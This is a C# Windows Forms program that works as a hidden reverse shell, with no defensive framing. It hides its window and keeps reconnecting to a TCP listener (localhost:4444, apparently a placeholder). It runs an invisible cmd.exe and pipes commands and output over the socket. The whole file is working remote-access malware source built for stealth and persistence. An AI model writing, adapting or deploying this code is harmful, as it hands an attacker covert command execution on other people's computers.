using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace PortBindingShellSender
{
    public partial class Form1 : Form
    {
        private TcpClient client;
        private NetworkStream stream;
        private StreamReader reader;
        private StreamWriter writer;
        private Process cmd;
        private StringBuilder builder;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (; ; )
            {
                RunServer();
                Thread.Sleep(5000);
            }
        }

        private void RunServer()
        {
            client = new TcpClient();
            builder = new StringBuilder();

            if (!client.Connected)
            {
                try
                {
                    client.Connect("localhost", 4444);
                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream);
                }
                catch (Exception err) { return; }

                cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardError = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.OutputDataReceived += new DataReceivedEventHandler(CmdDataOutputHandler);
                cmd.Start();
                cmd.BeginOutputReadLine();
            }
            while (true)
            {
                try
                {
                    builder.Append(reader.ReadLine());
                    builder.Append("\n");
                    if (builder.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (builder.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    cmd.StandardInput.WriteLine(builder);
                    builder.Remove(0, builder.Length);
                }
                catch (Exception e) { CleanUp(); break; }
            }
        }

        private void CleanUp()
        {
            try
            {
                cmd.Kill();
                stream.Close();
                writer.Close();
                reader.Close();
            }
            catch (Exception e) { }
        }

        private void StopServer()
        {
            CleanUp();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdDataOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            writer.WriteLine(outLine.Data.ToString());
            writer.Flush();
        }
    }
}
